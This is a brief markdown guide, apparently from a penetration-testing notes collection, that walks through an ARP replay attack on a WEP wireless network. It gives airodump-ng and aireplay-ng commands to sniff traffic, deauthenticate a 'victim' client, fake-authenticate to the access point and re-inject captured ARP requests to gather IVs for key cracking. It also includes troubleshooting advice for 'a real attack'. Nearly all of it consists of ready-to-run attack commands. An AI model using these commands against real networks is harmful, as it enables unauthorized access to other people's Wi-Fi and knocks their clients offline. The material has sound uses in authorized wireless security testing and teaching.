# ARP Replay Attack
> It's a famous technique to generate a lot of useful traffic (IVs) on a wireless network.

Sniff the network traffic

```sh
sudo airodump-ng -c <channel> -w wep_file wlan0mon
# Do not close this window
```

Make a [Deauthentication Attack](../Deauthentication%20Attack.md)

```sh
sudo aireplay-ng -0 10 -c <client_mac> -a <bssid> wlan0mon
# Do not close this window
```


- Step 1: Associate to the AP using Fake Authentication

```sh
sudo aireplay-ng -1 15 -a <bssid> -e <ssid> wlan0mon
# Do not close this window
```

**Troubleshooting: During a real attack, you can find that your adapter constantly receives deauthentication messages from the victim API. You can try this variation for picky APs**

```sh
sudo aireplay-ng -1 6000 -q 10 -o 1 -a <bssid> -e <ssid> wlan0mon
# Do not close this window
```

- Step 2: Listen for ARP requests sent by clients on the network.
 
```sh
sudo aireplay-ng -3 -b <bssid> wlan0mon
# Do not close this window
```

Note that this will not work if your STA is the only associated one!

- Step 3: After a few minutes, you should capture at least an ARP request

Now pinging a none existing IP from you victim client


- Step 4: Almost instantly aireplay-ng will start to re-inject the captured ARP request

- Step 5: Airodump-ng will show the increase in received data frames as you are flooding the API

Now [Crack the WEP key](./WEP%20Cracking.md)